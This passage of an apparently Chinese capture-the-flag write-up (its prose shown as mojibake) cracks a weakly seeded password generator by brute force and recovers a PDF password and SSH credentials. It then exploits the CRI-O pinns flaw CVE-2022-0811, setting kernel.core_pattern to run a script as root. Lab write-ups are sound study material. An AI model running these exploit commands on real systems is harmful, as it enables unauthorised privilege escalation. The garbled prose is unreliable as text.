            <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
                    charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">try</span><span class="token punctuation">:</span>
                        qsrand<span class="token punctuation">(</span>QTime<span class="token punctuation">.</span>currentTime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>msec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        password <span class="token operator">=</span> <span class="token string">''</span>
                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                            idx <span class="token operator">=</span> qrand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
                            nchar <span class="token operator">=</span> charset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
                            password <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nchar<span class="token punctuation">)</span>

                    <span class="token keyword">except</span><span class="token punctuation">:</span>
                        msg <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'Error while generating password!, Send a message to the Author!'</span><span class="token punctuation">)</span>
                        x <span class="token operator">=</span> msg<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">return</span> password


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QApplication<span class="token punctuation">(</span><span class="token punctuation">)</span>
    mainwindow <span class="token operator">=</span> MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span>
    mainwindow<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># okay decompiling passwordGenerator.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³é”®ä»£ç æ˜¯ä¸‹é¢çš„ç”Ÿæˆå¯†ç å‡½æ•°</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">genPassword</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> value
        char <span class="token operator">=</span> index
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
                    charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">try</span><span class="token punctuation">:</span>
                        qsrand<span class="token punctuation">(</span>QTime<span class="token punctuation">.</span>currentTime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>msec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        password <span class="token operator">=</span> <span class="token string">''</span>
                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                            idx <span class="token operator">=</span> qrand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
                            nchar <span class="token operator">=</span> charset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
                            password <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nchar<span class="token punctuation">)</span>

                    <span class="token keyword">except</span><span class="token punctuation">:</span>
                        msg <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span>
                        msg<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'Error while generating password!, Send a message to the Author!'</span><span class="token punctuation">)</span>
                        x <span class="token operator">=</span> msg<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">return</span> password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆ°æ­¤å‡½æ•°æç„¶å¤§æ‚Ÿï¼Œchar=0å°±æ˜¯<code>ALL Characters</code>ï¼Œchar=1æ˜¯<code>Alphabetic</code>(å­—æ¯)ï¼Œchar=2æ˜¯<code>Alphanumeric</code>(å­—æ¯æ•°å­—)ï¼Œé‚£æ ¹æ®åˆšæ‰çœ‹åˆ°çš„<code>screenshot.png</code>ï¼Œåˆç†æ¨æµ‹ç¬¬ä¸‰è¡Œchar=index=0ï¼Œç¬¬äºŒè¡Œlength=value=32ã€‚æ ¹æ®passwordç”Ÿæˆé€»è¾‘ï¼Œcharsetæœ‰89ä¸ªå­—ç¬¦ï¼Œæ¯ä¸€ä½éƒ½ä»è¿™89ä¸ªå­—ç¬¦ä¸­ç”¨qrand()éšæœºä¸€ä¸ªï¼Œé‚£ä¹ˆ32ä½çš„passwordå°±æœ‰89çš„32æ¬¡æ–¹ç§å¯èƒ½ã€‚ä½†æ˜¯<code>qsrand(QTime.currentTime().msec())</code>ä¸­çš„<code>.msec()</code>è¿”å›æ—¶é—´çš„æ¯«ç§’éƒ¨åˆ†ï¼Œä¸”èŒƒå›´æ˜¯0-999ï¼Œæ‰€ä»¥éšæœºæ•°ç§å­åªæœ‰1000ç§å¯èƒ½ï¼Œå¯ä»¥çˆ†ç ´ã€‚</p>
<p>çˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼ˆç”±äºLinuxå’ŒWindowsçš„pythonç§Qtåº“å¯èƒ½ä¸å¤ªä¸€æ ·ï¼Œæ‰€ä»¥éœ€åœ¨Windowsä¸‹è¿è¡Œè„šæœ¬ï¼Œåœ¨Linuxä¸‹è¿è¡Œä¼šæ‰¾ä¸åˆ°pdfå¯†ç ï¼Œè€Œä¸”<code>passwordGenerator</code>ä¹Ÿæ˜¯Windowsç¨‹åºï¼‰</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> qsrand<span class="token punctuation">,</span> qrand

<span class="token keyword">def</span> <span class="token function">genPassword</span><span class="token punctuation">(</span>ms<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    length <span class="token operator">=</span> <span class="token number">32</span>
    charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'</span>

    qsrand<span class="token punctuation">(</span>ms<span class="token punctuation">)</span>
    password <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        idx <span class="token operator">=</span> qrand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
        nchar <span class="token operator">=</span> charset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
        password <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nchar<span class="token punctuation">)</span>
    <span class="token keyword">return</span> password

passwords <span class="token operator">=</span> <span class="token punctuation">[</span>genPassword<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'generated.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>passwords<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŠŠåˆšç”Ÿæˆçš„txtæ–‡ä»¶å½“ä½œå­—å…¸ï¼Œç”¨<code>pdfcrack</code>çˆ†ç ´ï¼Œæ‰¾åˆ°å¯†ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# pdfcrack -f notes.pdf -w generated.txt
PDF version 1.6
Security Handler: Standard
V: 2
R: 3
P: -1028
Length: 128
Encrypted Metadata: True
FileID: c19b3bb1183870f00d63a766a1f80e68
U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
found user-password: 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰“å¼€pdfæ–‡ä»¶å¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327162031276.png" style="zoom:80%;">

<p>è·å¾—ç”¨æˆ·å¯†ç </p>
<pre class="line-numbers language-none"><code class="language-none">Ethan
b@mPRNSVTjjLKId1T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>sshè¿ä¸Š</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327162224496.png" style="zoom:80%;">

<p>ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥è¯¢æ‹¥æœ‰suidæƒé™çš„æ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ find / -perm -u=s -type f 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
/usr/bin/pinns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åä¸€ä¸ª<code>/usr/bin/pinns</code>æœ€å¯ç–‘ï¼Œgoogleä¸€ä¸‹<code>pinns exploit</code>ï¼Œçœ‹åˆ°å¦‚ä¸‹æ–‡ç« </p>
<p><a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></p>
<h2 id="ä¸ƒã€CVE-2022-0811"><a href="#ä¸ƒã€CVE-2022-0811" class="headerlink" title="ä¸ƒã€CVE-2022-0811"></a>ä¸ƒã€CVE-2022-0811</h2><p>æ¼æ´äº§ç”Ÿçš„åº”ç”¨æ˜¯CRI-Oï¼ˆä¸€ä¸ªåŸºäºKubernetesçš„å®æ—¶å®¹å™¨å¼•æ“ï¼‰ï¼Œæ¼æ´åç§°å«<code>cr8escape</code></p>
<p>åœ¨CRI-Oç‰ˆæœ¬1.19ï¼Œpinnsæ”¯æŒ<code>sysctl</code>(system control)ï¼Œå³å¯ä»¥è¢«ç”¨æ¥è®¾ç½®å†…æ ¸å‚æ•°å€¼ï¼Œè€Œä¸”ä¸éœ€è¦ä»»ä½•è®¤è¯ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹</p>
<p>å†…æ ¸å‚æ•°ï¼š<a href="https://docs.kernel.org/admin-guide/sysctl/kernel.html">https://docs.kernel.org/admin-guide/sysctl/kernel.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">pinns -s kernel_parameter1=value1+kernel_parameter2=value2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶ä¸­<code>kernel_parameter1</code>å’Œ<code>kernel_parameter2</code>æ˜¯ä¸¤ä¸ªå‚æ•°åï¼Œä¸¤ä¸ªèµ‹å€¼è¯­å¥ä¸­é—´ç”¨â€œ+â€è¿æ¥ï¼Œpinnsåªæ£€æŸ¥<code>kernel_parameter1</code>ä»¥ç¡®ä¿æ˜¯ä¸€ä¸ªå®‰å…¨çš„å†…æ ¸å‚æ•°ï¼Œ<code>kernel_parameter2</code>å¯ä»¥è¢«è®¾ç½®ä¸ºä»»æ„çš„å†…æ ¸å‚æ•°</p>
<p>ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹CRI-Oç‰ˆæœ¬æ˜¯1.19.6ï¼Œå±äºæ¼æ´è¦†ç›–èŒƒå›´</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ crio --version
crio version 1.19.6
Version:       1.19.6
GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
GitTreeState:  clean
BuildDate:     2022-03-15T18:18:24Z
GoVersion:     go1.15.2
Compiler:      gc
Platform:      linux/amd64
Linkmode:      dynamic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‚è€ƒä¸Šé¢crowdstrikeçš„CVEåˆ†ææ–‡ç« ï¼Œæ–‡ç« ä¸­ç”¨çš„å†…æ ¸å‚æ•°æ˜¯<code>kernel.shm_rmid_forced</code>å’Œ<code>kernel.core_pattern</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230328172027114.png" style="zoom:80%;">

<p><code>kernel.shm_rmid_forced=1</code>è¡¨ç¤ºæ²¡æœ‰ç”¨æˆ·å ç”¨ã€ä¸”è¿›ç¨‹å·²è¢«ç»ˆæ­¢çš„å…±äº«å†…å­˜æ®µä¼šè¢«è‡ªåŠ¨é”€æ¯</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230328171856037.png" style="zoom:80%;">

<p><code>kernel.core_pattern</code>çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¦‚æœæ˜¯â€œ|â€ï¼Œé‚£ä¹ˆåé¢çš„å­—ç¬¦ä¸²å°±ä¼šå½“ä½œå‘½ä»¤è¢«æ‰§è¡Œ</p>
<p>æ­¤å¤„æœ‰ä¸ªæ¦‚å¿µï¼šå†…æ ¸è½¬å‚¨ï¼ˆcoredumpï¼‰ï¼Œåœ¨è¿›ç¨‹å‘ç”Ÿé—®é¢˜æ—¶ä¿å­˜è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€</p>
<p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/191a62f4f6b9?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/191a62f4f6b9?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>
<p>ç›˜ä¸€ç›˜é€»è¾‘ï¼šæŸä¸€è¿›ç¨‹å‘ç”Ÿé—®é¢˜â†’è§¦å‘å†…æ ¸è½¬å‚¨â†’å†…æ ¸è½¬å‚¨ä¼šæ ¹æ®<code>kernel.core_pattern</code>çš„è®¾ç½®ç¡®å®šå­˜å‚¨ä¿¡æ¯çš„æ–‡ä»¶â†’<code>kernel.core_pattern</code>ç¬¬ä¸€ä¸ªå­—ç¬¦â€œ|â€åçš„å­—ç¬¦ä¸²ä¼šå½“ä½œå‘½ä»¤è¢«æ‰§è¡Œ</p>
<p>ä¸­é—´çš„éƒ¨åˆ†æ“ä½œç³»ç»Ÿè‡ªåŠ¨å¤„ç†ä¸ç”¨ç®¡ï¼Œåªéœ€è¦æ“ä½œç¬¬ä¸€æ­¥å’Œæœ€åä¸€æ­¥ï¼Œå³æƒ³åŠæ³•è®©æŸä¸€è¿›ç¨‹å‡ºé—®é¢˜ï¼Œå¹¶ä¸”é¢„å…ˆè®¾ç½®å¥½<code>kernel.core_pattern</code>çš„å€¼ï¼Œä¾¿äºæ‰§è¡Œå‘½ä»¤</p>
<p>è®©æŸä¸€è¿›ç¨‹å‡ºé—®é¢˜ï¼šå¯ä»¥ç”¨<code>kill</code>è¿›ç¨‹çš„æ–¹å¼å®ç°</p>
<p>é¢„å…ˆè®¾ç½®<code>kernel.core_pattern</code>çš„å€¼ï¼šæ­¤å¤„æ˜¯pinnsæä¾›äº†ä¿®æ”¹å†…æ ¸å‚æ•°çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ç”¨pinnså»è®¾ç½®ï¼Œæ ¼å¼å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">pinns -s kernel_parameter1=value1+kernel_parameter2=value2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ³¨ï¼šä¿è¯<code>kernel_parameter1=value1</code>æ˜¯åˆæ³•èµ‹å€¼ï¼Œ<code>kernel_parameter2</code>ä½ç½®æ˜¯<code>kernel.core_pattern</code>ï¼Œ<code>value2</code>ä½ç½®æ˜¯â€œ|â€å¼€å¤´ï¼Œåé¢è·Ÿæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤æˆ–è€…è„šæœ¬æ–‡ä»¶</p>
<p>äºæ˜¯ç”¨æ„é€ å¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…ˆæŸ¥çœ‹æƒ³è¦ä¿®æ”¹çš„ä¸¤ä¸ªæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
|/usr/share/apport/apport %p %s %c %d %P %E
0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œæ„é€ å¥½çš„å‘½ä»¤ï¼Œå‘ç°å¦‚ä¸‹æŠ¥é”™ï¼Œå¹¶ä¸”æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶ï¼Œæ²¡æœ‰å˜åŒ–</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #'
[pinns:e]: Path for pinning namespaces not specified: Invalid argument<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹pinnxæºç ï¼Œå‘ç°æŠ¥é”™çš„åŸå› </p>
<p>pinnsæºç ï¼š<a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c">https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c</a></p>
<p>å‘ç°å¦‚ä¸‹ä¸¤ä¸ªé€»è¾‘ä»£ç æ®µ</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">option</span> long_options<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span><span class="token string">"help"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'h'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"uts"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'u'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"ipc"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'i'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"net"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'n'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"user"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'U'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"cgroup"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'c'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"dir"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'d'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"filename"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'f'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">"sysctl"</span><span class="token punctuation">,</span> optional_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token char">'s'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pin_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">pexit</span><span class="token punctuation">(</span><span class="token string">"Path for pinning namespaces not specified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">pexit</span><span class="token punctuation">(</span><span class="token string">"Filename for pinning namespaces not specified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">directory_exists_or_create</span><span class="token punctuation">(</span>pin_path<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">nexitf</span><span class="token punctuation">(</span><span class="token string">"%s exists but is not a directory"</span><span class="token punctuation">,</span> pin_path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>num_unshares <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">nexit</span><span class="token punctuation">(</span><span class="token string">"No namespace specified for pinning"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unshare</span><span class="token punctuation">(</span>unshare_flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">pexit</span><span class="token punctuation">(</span><span class="token string">"Failed to unshare namespaces"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»“åˆå…¨éƒ¨ä»£ç åˆ†æï¼Œæ•´ä½“è¦æ±‚å°±æ˜¯ï¼š</p>
<p>1.è¦æœ‰<code>-d</code>å‚æ•°ï¼Œä¸”å‚æ•°å€¼æŒ‡å®šç›®å½•è¦å­˜åœ¨æˆ–è€…å¯ä»¥è¢«åˆ›å»ºï¼›</p>
<p>2.è¦æœ‰<code>-f</code>å‚æ•°ï¼Œå‚æ•°å€¼ä»»æ„ï¼Œä½†ä¸èƒ½ä¸ºç©ºï¼›</p>
<p>3.<code>-u -i -n -U</code>å››ä¸ªå‚æ•°è‡³å°‘æœ‰ä¸€ä¸ªï¼ˆæ­¤å¤„ç¬”è€…åªè¯•äº†ä¸€ä¸ª<code>-U</code>ï¼Œç†è®ºä¸Šä¿è¯<code>num_unshares</code>ä¸ä¸º0å³å¯ï¼‰ã€‚</p>
<p>é‡æ–°æ„é€ ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/dev/shm/exp.sh #' -f file -d /dev/shm -U
[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è™½æœ‰æŠ¥é”™ï¼Œä½†ä¸å½±å“ï¼Œå†æ¬¡æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶å†…å®¹ï¼Œä¿®æ”¹æˆåŠŸ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
|/dev/shm/exp.sh #
1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

